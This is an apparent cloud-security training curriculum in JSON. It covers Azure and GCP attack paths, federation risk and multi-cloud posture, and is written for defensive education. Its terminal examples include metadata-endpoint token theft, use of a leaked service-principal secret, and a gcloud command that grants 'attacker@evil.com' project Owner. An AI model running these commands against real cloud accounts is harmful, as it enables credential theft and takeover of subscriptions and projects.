+        "id": "cloud-m13-2",
+        "moduleId": "cloud-m13",
+        "number": 79,
+        "title": "Azure Attack Paths",
+        "type": "lab",
+        "week": 4,
+        "description": "Hands-on Azure offence. Students abuse managed identities, over-privileged service principals and the Azure metadata endpoint.",
+        "keyPoints": [
+          "Managed identity credential theft via the IMDS endpoint (Metadata:true header)",
+          "Service principal / app registration secret and certificate abuse",
+          "Azure RBAC escalation: Owner/User Access Administrator, custom-role actions",
+          "AzureHound / ROADtools for attack-path graphing in Entra",
+          "Storage account key and SAS-token exposure (the Blob equivalent of S3)"
+        ],
+        "slides": [
+          {
+            "title": "Turning identity misconfig into access",
+            "body": "This topic is the offensive counterpart to the Azure identity model. You already know the pieces — managed identities, service principals, RBAC roles, storage keys. Here you weaponise them.\n\nAnalogy: in the last topic you learned where the badges and locks are. Now you learn how an attacker who lands on one Azure VM lifts a badge off the wall (the managed-identity token), copies a contractor's keycard (a leaked SP secret), and finds a door that lets them cut new keys for every room (an RBAC role that can assign roles). The theme throughout: a foothold on one resource becomes control of the identity plane."
+          },
+          {
+            "title": "Managed identity token theft via IMDS",
+            "body": "Every Azure VM can reach a link-local Instance Metadata Service (IMDS) at 169.254.169.254. If the VM has a managed identity, IMDS will hand out a bearer token for it to any process on the box — no secret required. An attacker with code execution (RCE, a web shell, an SSRF that can set headers) simply asks IMDS for a token scoped to Azure Resource Manager and then calls ARM as that identity.\n\nCrucial detail: Azure IMDS requires the request to carry the header `Metadata: true`. Without that header the endpoint refuses, which is why blind SSRF alone often cannot reach it.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "vm$",
+              "lines": [
+                {
+                  "command": "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+                  "output": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\",\"expires_on\":\"1731740400\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}"
+                }
+              ]
+            },
+            "check": {
+              "question": "Which HTTP header must accompany a token request to the Azure IMDS endpoint?",
+              "options": [
+                "Metadata: true",
+                "Metadata-Flavor: Google",
+                "X-aws-ec2-metadata-token: <token>",
+                "Authorization: Bearer <token>"
+              ],
+              "correctIndex": 0,
+              "explanation": "Azure IMDS mandates the 'Metadata: true' header. This requirement is also a mild defence: a simple SSRF that cannot set arbitrary headers usually cannot reach IMDS."
+            }
+          },
+          {
+            "title": "The token request on the wire",
+            "body": "The exchange is a plain HTTP GET to a link-local address that never leaves the host's network stack. The response is a short-lived JWT access token for the VM's managed identity, scoped to whatever `resource` was requested (here, the ARM management API). The attacker now holds the VM's cloud identity.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Compromised VM",
+              "rightLabel": "IMDS 169.254.169.254",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GET /metadata/identity/oauth2/token",
+                  "payload": "Header: Metadata: true   resource=management.azure.com"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK",
+                  "payload": "access_token = Bearer JWT for the VM's managed identity"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Using the stolen token",
+            "body": "With the bearer token the attacker calls ARM directly or, if the Azure CLI is present on the box, runs `az login --identity` to authenticate as the managed identity, then enumerates what it can reach. The impact is bounded entirely by the RBAC roles assigned to that identity — which is the whole argument for least-privilege managed identities.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "vm$",
+              "lines": [
+                {
+                  "command": "az login --identity",
+                  "output": "[{ \"id\": \"/subscriptions/8f...\", \"user\": { \"assignedIdentity\": \"vm-prod-mi\" } }]"
+                },
+                {
+                  "command": "az storage account list -o table",
+                  "output": "Name            ResourceGroup   Kind       (readable because the MI has Contributor on 'prod')"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Service principal secret and certificate abuse",
+            "body": "Not every Azure identity is passwordless. App registrations and their service principals authenticate with a client secret or a certificate. These end up hard-coded in source, baked into container images, dropped in CI/CD variables, or committed to Git. A leaked client secret is a direct, often long-lived login.\n\nWith the triplet (appId, secret, tenantId) an attacker signs in non-interactively and inherits whatever the SP can do — which is frequently over-broad.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "az login --service-principal -u 2b1a... -p 'LEAKED_SECRET' --tenant 9c3f...",
+                  "output": "[{ \"name\": \"ci-deployer-sp\", \"tenantId\": \"9c3f...\" }]"
+                },
+                {
+                  "command": "az role assignment list --assignee 2b1a... -o table",
+                  "output": "Role        Scope\nContributor /subscriptions/8f...   <- SP over-scoped to the whole subscription"
+                }
+              ]
+            }
+          },
+          {
+            "title": "RBAC escalation to full control",
+            "body": "The crown-jewel RBAC action is `Microsoft.Authorization/roleAssignments/write` — the ability to create role assignments. Two built-in roles grant it: Owner and User Access Administrator. Any principal holding either (or a sloppy custom role that includes it) can grant itself or a new identity the Owner role and take over the scope.\n\nThis is why a 'Contributor' that also somehow has roleAssignments/write is a critical finding: Contributor was supposed to manage resources, not hand out keys.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Foothold identity",
+                  "detail": "User Access Admin or Owner"
+                },
+                {
+                  "label": "roleAssignments/write",
+                  "detail": "can create assignments"
+                },
+                {
+                  "label": "Grant self Owner",
+                  "detail": "at subscription scope"
+                },
+                {
+                  "label": "Full control",
+                  "detail": "every resource + re-grant"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Graphing the attack path",
+            "body": "Doing this by hand across a large tenant is slow. AzureHound collects Entra objects and Azure RBAC assignments and feeds them into BloodHound, which draws the graph and computes the shortest path from a controlled principal to Global Admin or Owner. ROADtools (roadrecon) is the complementary Entra-focused collector and analyser.\n\nThese tools turn 'is there a path from this low-priv SP to Owner?' from a week of manual queries into a single graph query."
+          },
+          {
+            "title": "Storage keys and SAS tokens: the Blob S3-moment",
+            "body": "Azure Blob Storage is the equivalent of S3, and it leaks the same way. Each storage account has two all-powerful account keys that grant full read/write to every container — the analogue of root S3 credentials. Shared Access Signature (SAS) tokens are scoped, time-limited URLs, but are routinely minted over-permissioned and long-lived, then leaked in links and logs. And containers set to public access are the direct equivalent of a public S3 bucket.\n\n`az storage account keys list` dumps the account keys if your identity can read them — instant full data access."
+          },
+          {
+            "title": "Defend, then why it matters",
+            "body": "Fixes, roughly in order of leverage:\n- Prefer managed identities over secrets, and scope each one to the minimum RBAC role at the narrowest scope.\n- Disable storage account key access (force Entra ID authorization); if SAS is needed, keep it short-lived and least-privilege; enable 'public access prevention'.\n- Use Privileged Identity Management (PIM) so Owner/User Access Administrator are just-in-time, not standing.\n- Enforce Conditional Access and block legacy auth so stolen SP secrets still need to clear policy.\n\nThis is the Azure 'Managed-Identity Heist' lab: steal a VM's token from IMDS, use it to reach resources, then re-scope the identity so the same attack returns nothing. It matters because a single RCE on one VM routinely becomes subscription-wide Owner — unless least privilege and PIM cap the blast radius."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m13-3",
+        "moduleId": "cloud-m13",
+        "number": 80,
+        "title": "GCP Identity & Service Accounts",
+        "type": "theory",
+        "week": 4,
+        "description": "GCP's resource-hierarchy-inherited IAM and its service-account-centric model, which drives most GCP attack paths.",
+        "keyPoints": [
+          "IAM bindings inherited org -> folder -> project -> resource",
+          "Service accounts as first-class identities; SA keys as leakable credentials",
+          "Primitive (Owner/Editor/Viewer) vs predefined vs custom roles",
+          "The actAs / iam.serviceAccounts.getAccessToken impersonation edge",
+          "Default service accounts (Compute Engine default SA) as over-privileged targets"
+        ],
+        "slides": [
+          {
+            "title": "GCP IAM: hierarchy plus service accounts",
+            "body": "Google Cloud's identity model rests on two ideas. First, everything lives in a resource hierarchy — Organization at the top, then Folders, then Projects, then individual resources — and IAM permissions granted higher up are inherited by everything below. Second, service accounts (SAs) are first-class identities: non-human accounts that applications, VMs and automation use to act.\n\nAnalogy: an org chart where a permission granted to a department head silently applies to every team and employee under them. Most GCP attack paths are really about who can act as which service account."
+          },
+          {
+            "title": "The resource hierarchy inherits downward",
+            "body": "An IAM policy (a set of bindings) can be attached at any level of the hierarchy. A binding attached at the Organization applies to every folder, project and resource beneath it. This is powerful and dangerous: granting 'Editor' at the org or folder level quietly makes the grantee an Editor on every current and future project.\n\nTo understand effective access on any resource, you must walk upward and union every inherited binding.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "Organization",
+                  "highlighted": true
+                },
+                {
+                  "id": "folder",
+                  "label": "Folder (Engineering)"
+                },
+                {
+                  "id": "proj",
+                  "label": "Project (prod-app)"
+                },
+                {
+                  "id": "res",
+                  "label": "Resource (GCE VM, GCS bucket)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "org",
+                  "to": "folder",
+                  "label": "inherits"
+                },
+                {
+                  "from": "folder",
+                  "to": "proj",
+                  "label": "inherits"
+                },
+                {
+                  "from": "proj",
+                  "to": "res",
+                  "label": "inherits"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The anatomy of an IAM binding",
+            "body": "A binding is a simple triple: member + role on a resource's IAM policy. Member types include `user:alice@...`, `group:...`, `serviceAccount:sa@project.iam.gserviceaccount.com`, and two special all-access members:\n\n- `allUsers` — literally anyone on the internet, unauthenticated.\n- `allAuthenticatedUsers` — any Google account at all, not just your org.\n\nThose last two are the GCP equivalent of making something public, and they are a frequent cause of open buckets."
+          },
+          {
+            "title": "Service accounts and their leakable keys",
+            "body": "A service account is an identity with an email address like `app@prod.iam.gserviceaccount.com`. Code authenticates as it to call Google APIs. There are two ways to hold that identity's credentials: a short-lived token minted at runtime (safer), or a long-lived JSON key file you download.\n\nThat `key.json` is the problem. It is effectively a password that does not expire, and it ends up in Git, container images and CI. One leaked key file is a persistent login as that service account.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "gcloud iam service-accounts keys create key.json --iam-account=app@prod.iam.gserviceaccount.com",
+                  "output": "created key [a1b2...] of type [json] as [key.json]"
+                },
+                {
+                  "command": "gcloud auth activate-service-account --key-file=key.json",
+                  "output": "Activated service account credentials for: [app@prod.iam.gserviceaccount.com]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Three tiers of roles",
+            "body": "GCP roles come in three flavours, and the first is a trap. Primitive roles (Owner/Editor/Viewer) are legacy, project-wide and enormously broad — Editor alone can modify almost everything. Predefined roles (like roles/storage.admin) are service-specific and curated by Google for least privilege. Custom roles let you hand-pick the exact permission strings and maintain them yourself.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Primitive (avoid)",
+                  "points": [
+                    "Owner / Editor / Viewer",
+                    "Project-wide, extremely broad",
+                    "Legacy; Editor can change almost anything",
+                    "A foothold here = near-total project control"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Predefined",
+                  "points": [
+                    "e.g. roles/storage.admin",
+                    "Service-scoped, curated by Google",
+                    "Least-privilege friendly",
+                    "Preferred default choice"
+                  ]
+                },
+                {
+                  "label": "Custom",
+                  "points": [
+                    "You pick exact permissions",
+                    "Most granular control",
+                    "You own maintenance",
+                    "Use when predefined is too broad"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "The impersonation edge",
+            "body": "The defining GCP attack primitive is service-account impersonation. If identity A holds the right permission on service account B, A can act as B without ever seeing B's key. The key permissions:\n\n- `iam.serviceAccounts.getAccessToken` — mint a short-lived OAuth token for B (direct impersonation). Granted by the role roles/iam.serviceAccountTokenCreator.\n- `iam.serviceAccounts.signJwt` — sign a JWT as B.\n- `iam.serviceAccounts.actAs` — attach B to a resource you create (e.g. deploy a function that runs as B).\n\nChaining these from a low-privilege identity up to a powerful SA is how most GCP escalations work.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Low-priv identity",
+                  "detail": "has Token Creator on B"
+                },
+                {
+                  "label": "getAccessToken",
+                  "detail": "iam.serviceAccounts.getAccessToken"
+                },
+                {
+                  "label": "Token for SA 'B'",
+                  "detail": "short-lived, acts as B"
+                },
+                {
+                  "label": "B's privileges",
+                  "detail": "whatever B can do"
+                }
+              ]
+            },
+            "check": {
+              "question": "Which permission lets an identity mint an access token for another service account (direct impersonation)?",
+              "options": [
+                "iam.serviceAccounts.getAccessToken",
+                "storage.objects.get",
+                "compute.instances.list",
+                "resourcemanager.projects.get"
+              ],
+              "correctIndex": 0,
+              "explanation": "iam.serviceAccounts.getAccessToken (granted by roles/iam.serviceAccountTokenCreator) mints a short-lived OAuth token for the target SA, letting the caller act as it without its key."
+            }
+          },
+          {
+            "title": "The over-privileged default service account",
+            "body": "Historically, every Compute Engine VM is created with the Compute Engine default service account (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`) attached, and that account is granted the primitive Editor role on the whole project by default. Combine that with the VM's default access scopes and a single foothold on any VM yields Editor over the entire project.\n\nModern projects can disable the automatic Editor grant with the org policy `iam.automaticIamGrantsForDefaultServiceAccounts`, and should attach a minimal custom SA instead."
+          },
+          {
+            "title": "Why it matters",
+            "body": "In GCP, 'who can act as whom' matters more than 'who has which role on which resource'. Inherited bindings mean a single broad grant high in the hierarchy quietly reaches everything, leakable SA keys provide persistence, and the impersonation edges let attackers climb from a weak identity to a strong one. Keep these three facts in mind and the next topic's attack paths will read like a map you already own."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m13-4",
+        "moduleId": "cloud-m13",
+        "number": 81,
+        "title": "GCP Attack Paths",
+        "type": "lab",
+        "week": 4,
+        "description": "Hands-on GCP offence. Students exploit service-account impersonation chains, the metadata endpoint and open storage buckets.",
+        "keyPoints": [
+          "Service-account impersonation chaining (getAccessToken / signJwt / actAs)",
+          "GCE metadata endpoint for the attached SA token (Metadata-Flavor:Google header)",
+          "setIamPolicy and over-broad project roles for escalation",
+          "GCS bucket exposure and allUsers/allAuthenticatedUsers bindings",
+          "Tools: ScoutSuite GCP, GCPBucketBrute, hayat / gcp enumeration scripts"
+        ],
+        "slides": [
+          {
+            "title": "Chaining GCP misconfigurations",
+            "body": "This is the hands-on offensive topic for GCP. You take the primitives from the previous topic — inherited bindings, leakable SA keys, the metadata endpoint, impersonation edges — and chain them into real escalation.\n\nThe canonical GCP kill chain: land on a VM, steal the attached service account's token from the metadata server, enumerate what that SA can reach, find an impersonation or setIamPolicy edge to a more powerful SA, and climb until you reach a project Owner or an open bucket full of data."
+          },
+          {
+            "title": "Stealing the attached SA token from metadata",
+            "body": "Like AWS and Azure, every GCE VM has a link-local metadata server, reachable at `metadata.google.internal` (169.254.169.254). It will hand any process on the VM an OAuth token for the service account attached to that instance. The one requirement is the header `Metadata-Flavor: Google` — a deliberate anti-SSRF guard, since a request that cannot set headers (and does not send the forbidden `X-Forwarded-For`) is refused.\n\nYou can also read the SA's email and granted scopes from adjacent metadata paths.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "vm$",
+              "lines": [
+                {
+                  "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
+                  "output": "{\"access_token\":\"ya29.c.b0Aa...\",\"expires_in\":3599,\"token_type\":\"Bearer\"}"
+                },
+                {
+                  "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'",
+                  "output": "prod-app@prod.iam.gserviceaccount.com"
+                }
+              ]
+            },
+            "check": {
+              "question": "Which HTTP header is required to retrieve a token from the GCE metadata server?",
+              "options": [
+                "Metadata: true",
+                "Metadata-Flavor: Google",
+                "X-aws-ec2-metadata-token",
+                "Authorization: Google"
+              ],
+              "correctIndex": 1,
+              "explanation": "GCP requires 'Metadata-Flavor: Google'. Each cloud uses a different guard — AWS IMDSv2 uses a token header, Azure uses 'Metadata: true', GCP uses 'Metadata-Flavor: Google' — which is a handy way to fingerprint the platform."
+            }
+          },
+          {
+            "title": "The metadata exchange",
+            "body": "The request never leaves the host; the response is a short-lived bearer token for the instance's service account, scoped to the access scopes configured on the VM. From here the attacker is authenticated as that SA against every Google API the scopes and IAM allow.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Compromised GCE VM",
+              "rightLabel": "metadata.google.internal",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GET .../service-accounts/default/token",
+                  "payload": "Header: Metadata-Flavor: Google"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK",
+                  "payload": "ya29... OAuth token of the attached service account"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Impersonation chaining",
+            "body": "Rarely does the first SA you steal own everything. The escalation is to find an impersonation edge: the current SA has Token Creator (or actAs) on a second, more privileged SA, which in turn can reach a third. Each hop uses `getAccessToken`, `signJwt` or `actAs` to become the next identity, until you reach one with Owner or a sensitive data path.\n\nThe gcloud CLI makes each hop one flag: `--impersonate-service-account`.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "low",
+                  "label": "prod-app SA (stolen token)"
+                },
+                {
+                  "id": "mid",
+                  "label": "deploy SA (Token Creator target)",
+                  "highlighted": true
+                },
+                {
+                  "id": "high",
+                  "label": "admin SA (project Owner)",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "low",
+                  "to": "mid",
+                  "label": "getAccessToken"
+                },
+                {
+                  "from": "mid",
+                  "to": "high",
+                  "label": "actAs / getAccessToken"
+                }
+              ]
+            }
+          },
+          {
+            "title": "setIamPolicy and over-broad roles",
+            "body": "The single most dangerous project permission is `resourcemanager.projects.setIamPolicy` — the ability to rewrite the project's IAM policy. An identity holding it can add a binding granting itself (or a fresh SA) the Owner role, instantly taking the project over. It is included in roles/owner and roles/resourcemanager.projectIamAdmin.\n\nOther escalation-prone grants to flag: roles/iam.serviceAccountKeyAdmin (mint keys for any SA), roles/iam.securityAdmin, and the compute/cloudfunctions/deploymentmanager roles that let you run code as a privileged SA.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "gcloud projects add-iam-policy-binding prod-app --member='user:attacker@evil.com' --role='roles/owner'",
+                  "output": "Updated IAM policy for project [prod-app].\nbindings:\n- members: ['user:attacker@evil.com']\n  role: roles/owner"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Open buckets: allUsers and allAuthenticatedUsers",
+            "body": "Cloud Storage is GCP's S3. A bucket or object becomes world-readable the moment its IAM policy binds `roles/storage.objectViewer` to `allUsers` (anyone on the internet) or `allAuthenticatedUsers` (any Google account). This is the exact analogue of a public S3 bucket, and it leaks the same way — backups, exports, credentials.\n\nAttackers enumerate likely bucket names and probe permissions; defenders enable 'public access prevention' and 'uniform bucket-level access' to make these bindings impossible."
+          },
+          {
+            "title": "Tooling for GCP offence",
+            "body": "You do not enumerate by hand. Core tools:\n- ScoutSuite (GCP module) — authenticated multi-service audit that flags risky bindings, open buckets and over-privileged SAs.\n- GCPBucketBrute — guesses Cloud Storage bucket names from a keyword and reports which are public or list-able, with or without credentials.\n- hayat and various gcloud enumeration scripts — dump IAM policies, SAs and keys across a project for offline analysis.\n\nRun ScoutSuite for breadth, GCPBucketBrute for the storage attack surface, and gcloud for targeted impersonation testing."
+          },
+          {
+            "title": "Defend, then the lab",
+            "body": "Hardening, by leverage:\n- Remove SA keys; use Workload Identity / attached SAs with runtime tokens instead.\n- Replace primitive roles and the default-SA Editor grant with minimal predefined/custom roles.\n- Cut impersonation edges — only grant Token Creator and actAs where genuinely required, and audit who holds them.\n- Enable public access prevention, uniform bucket-level access, and VPC Service Controls to fence data exfiltration.\n\nThis is the 'GCP Impersonation Chain' lab: start as a low-privilege identity, impersonate upward to a highly privileged service account, prove the takeover, then cut the actAs edge so the chain breaks. The lesson: in GCP, the attack path and the fix are both a single edge in the impersonation graph."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m13-5",
+        "moduleId": "cloud-m13",
+        "number": 82,
+        "title": "Cross-Cloud & Federation Risk",
+        "type": "theory",
+        "week": 4,
+        "description": "Multi-cloud introduces identity bridges that are powerful and dangerous. Federation lets one cloud's identity act in another, widening blast radius.",
+        "keyPoints": [
+          "Workload identity federation: GCP/Azure workload assuming an AWS role via OIDC",
+          "Entra ID federating into AWS (and vice versa) via SAML/OIDC",
+          "A single IdP compromise cascading across all federated clouds",
+          "Third-party SaaS with cross-cloud access as a supply-chain risk",
+          "Securing trust: tight audience/subject claims, conditions, and monitoring"
+        ],
+        "slides": [
+          {
+            "title": "Identities that cross cloud borders",
+            "body": "A multi-cloud reality creates a new kind of identity: one that is recognised in a cloud it does not live in. Federation lets a workload or user authenticated in one place act in another, without copying long-lived credentials around.\n\nAnalogy: a trusted-visitor badge. Your partner company's employee shows their own badge at your front desk, and because you trust their issuer, your desk prints a temporary visitor pass. Convenient — and dangerous, because now your security depends on their issuer being honest and their badge rules being tight."
+          },
+          {
+            "title": "Workload Identity Federation, step by step",
+            "body": "Workload Identity Federation (WIF) replaces static keys with on-the-fly token exchange. The workload proves its identity to its own trusted issuer (an OIDC provider), receives a short-lived, signed JWT, and presents that JWT to the target cloud's security token service. The target validates the token's issuer, audience and subject against a configured trust, and returns temporary credentials. No secret is ever stored.\n\nThis is how a GitHub Actions job, a GCP VM, or an Azure workload can call AWS without an access key.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Workload",
+                  "detail": "GitHub Action / GCP VM"
+                },
+                {
+                  "label": "Get OIDC token",
+                  "detail": "signed JWT, short-lived"
+                },
+                {
+                  "label": "STS exchange",
+                  "detail": "target cloud validates claims"
+                },
+                {
+                  "label": "Temp credentials",
+                  "detail": "scoped role, minutes not months"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked example: GitHub OIDC into AWS",
+            "body": "A GitHub Actions workflow needs to deploy to AWS. Instead of storing an AWS access key as a secret, the account trusts GitHub's OIDC issuer. At run time the job gets a GitHub OIDC JWT and calls `sts:AssumeRoleWithWebIdentity`; AWS checks the token and returns one hour of temporary credentials for a specific role.\n\nThe make-or-break is the role's trust policy. It must pin both the audience and the `sub` claim (the exact repo and branch). A trust policy that wildcards the `sub` lets any GitHub repository on earth assume the role — a well-known critical misconfiguration.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "GitHub Actions",
+              "rightLabel": "AWS STS",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "AssumeRoleWithWebIdentity",
+                  "payload": "OIDC JWT from token.actions.githubusercontent.com"
+                },
+                {
+                  "direction": "left",
+                  "label": "Temporary credentials",
+                  "payload": "AccessKeyId / SecretAccessKey / SessionToken (1h)"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why is workload identity federation generally preferred over storing a long-lived cloud access key?",
+              "options": [
+                "It is faster at runtime",
+                "There is no static secret to leak; it issues short-lived, scoped tokens",
+                "It removes the need for any IAM roles",
+                "It encrypts the network traffic, which keys do not"
+              ],
+              "correctIndex": 1,
+              "explanation": "WIF exchanges a short-lived OIDC token for temporary credentials, so there is no durable secret sitting in CI or config to be stolen. The trade-off is that the trust policy must pin claims tightly."
+            }
+          },
+          {
+            "title": "Entra and AWS federating both ways",
+            "body": "Federation is not only for machines. Enterprises commonly federate human sign-in: Entra ID acts as the identity provider (IdP) for AWS via SAML or OIDC, so staff log into the AWS console with their corporate account and assume an AWS role. The reverse also exists, and SaaS and IdPs like Okta sit in the middle of many such trusts.\n\nEach federation is a standing trust relationship. The security of the resource cloud now partly depends on the IdP's authentication strength, its MFA, and the correctness of the role/claim mapping."
+          },
+          {
+            "title": "Blast radius: one IdP, every cloud",
+            "body": "Centralising identity in a single IdP is good hygiene — until that IdP is compromised. If an attacker controls the IdP (or can mint tokens it signs), every cloud and SaaS that federates to it is reachable at once. The 2023 Okta and related supply-chain incidents showed how a single identity-provider breach cascades across an entire federated estate.\n\nThe graph makes the risk obvious: the IdP is a single node whose compromise lights up every downstream trust.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "idp",
+                  "label": "Central IdP (Entra / Okta)",
+                  "highlighted": true
+                },
+                {
+                  "id": "aws",
+                  "label": "AWS (assume role)"
+                },
+                {
+                  "id": "azure",
+                  "label": "Azure (sign-in)"
+                },
+                {
+                  "id": "gcp",
+                  "label": "GCP (WIF)"
+                },
+                {
+                  "id": "saas",
+                  "label": "SaaS apps"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "idp",
+                  "to": "aws",
+                  "label": "federated"
+                },
+                {
+                  "from": "idp",
+                  "to": "azure",
+                  "label": "federated"
+                },
+                {
+                  "from": "idp",
+                  "to": "gcp",
+                  "label": "federated"
+                },
+                {
+                  "from": "idp",
+                  "to": "saas",
+                  "label": "federated"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Third-party SaaS as a cross-cloud bridge",
+            "body": "Many SaaS products ask for cross-cloud access to do their job — a CI/CD platform, a CSPM scanner, a data pipeline. Granting them an AWS role or a GCP SA, or federating them in, makes them part of your trust boundary. If the vendor is breached, that standing access becomes the attacker's.\n\nThis is a supply-chain risk dressed as a convenience. Treat every third-party integration as a principal you must scope, monitor and be able to revoke quickly, and prefer per-tenant external IDs and conditions over broad trust."
+          },
+          {
+            "title": "Securing federated trust",
+            "body": "The controls that keep federation from becoming a backdoor:\n- Pin claims tightly: match the exact `aud` and `sub` (and for GitHub, repository and ref) with StringEquals, never a wildcard StringLike.\n- Keep token TTLs short and scope each federation to its own least-privilege role or SA.\n- Add conditions: source IP, device, time, or an external ID for third-party trusts.\n- Monitor the federation events (AssumeRoleWithWebIdentity, token exchanges, IdP sign-ins) and alert on new or unusual subjects.\n- Enforce strong MFA and phishing-resistant auth at the IdP, since it is the single point of failure."
+          },
+          {
+            "title": "Why it matters",
+            "body": "Federation is what makes multi-cloud usable, and it is also what makes a single mistake multi-cloud. One wildcarded trust policy exposes a role to the whole internet; one compromised IdP exposes every cloud at once; one breached SaaS vendor inherits your standing access. When you assess a multi-cloud estate, map the trust edges first — they are the shortest paths an attacker can take between otherwise separate clouds."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m13-6",
+        "moduleId": "cloud-m13",
+        "number": 83,
+        "title": "Unified Multi-Cloud Posture",
+        "type": "exercise",
+        "week": 4,
+        "description": "Bringing it together: securing and detecting across all three clouds with a consistent model and tooling.",
+        "keyPoints": [
+          "Common model: principals, roles/bindings, resource policies, metadata, logging",
+          "Cross-cloud CSPM/CNAPP (ScoutSuite, Prowler GCP/Azure, Wiz) for one view",
+          "Equivalent logs: CloudTrail / Azure Activity Log / GCP Cloud Audit Logs",
+          "Mapping ATT&CK cloud techniques consistently across providers",
+          "A single prioritised, cross-cloud risk register"
+        ],
+        "slides": [
+          {
+            "title": "One model, three dialects",
+            "body": "After AWS, Azure and GCP individually, the final skill is holding them in one head. The clouds differ in names and APIs but share a deep structure: principals that act, grants that permit, resource policies that expose, a metadata endpoint that leaks identity, and an audit log that records everything.\n\nAnalogy: same grammar, different dialects. Once you can say 'principal + role/binding + scope' and translate it into each provider's vocabulary, a finding in one cloud instantly suggests where to look in the others."
+          },
+          {
+            "title": "The common model across clouds",
+            "body": "Map every concept onto one spine and the three clouds line up. Principals (who acts), permission grants (what they may do), resource policies (what is exposed publicly), the metadata service (runtime identity theft), and logging (the record). Learn the spine once; fill in the per-cloud terms.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "IAM users / roles",
+                    "IAM policies + resource policies (S3 bucket policy)",
+                    "IMDS 169.254.169.254 (IMDSv2 token)",
+                    "CloudTrail"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "Entra principals + managed identities",
+                    "RBAC role assignments",
+                    "IMDS 169.254.169.254 (Metadata: true)",
+                    "Azure Activity Log + Entra sign-in logs"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Members + service accounts",
+                    "IAM bindings + org policy",
+                    "metadata.google.internal (Metadata-Flavor: Google)",
+                    "Cloud Audit Logs"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Metadata endpoints, three guards",
+            "body": "The metadata endpoint is the one attack primitive that is nearly identical everywhere: a link-local address that hands a workload its own credentials. What differs is the guard that an SSRF must defeat — and that difference is a free platform fingerprint.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "169.254.169.254",
+                    "IMDSv2: PUT to get a token, then header X-aws-ec2-metadata-token",
+                    "IMDSv1 (legacy) answered plain GETs"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "169.254.169.254",
+                    "Header: Metadata: true",
+                    "Path /metadata/identity/oauth2/token"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "metadata.google.internal",
+                    "Header: Metadata-Flavor: Google",
+                    "Path /computeMetadata/v1/.../token"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "One view with CSPM / CNAPP",
+            "body": "You cannot eyeball three consoles. Cloud Security Posture Management (CSPM) and the broader Cloud-Native Application Protection Platform (CNAPP) tools connect to all your cloud accounts and normalise their findings into one list: public buckets, over-privileged principals, exposed metadata, missing logging — described the same way regardless of provider.\n\nOpen-source: ScoutSuite (multi-cloud audit) and Prowler (AWS, plus Azure and GCP support). Commercial CNAPP: Wiz and peers, which add a cross-cloud risk graph.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Connect accounts",
+                  "detail": "AWS + Azure + GCP"
+                },
+                {
+                  "label": "Collect config",
+                  "detail": "IAM, storage, logging"
+                },
+                {
+                  "label": "Normalise",
+                  "detail": "one finding schema"
+                },
+                {
+                  "label": "Unified risk view",
+                  "detail": "ranked, cross-cloud"
+                }
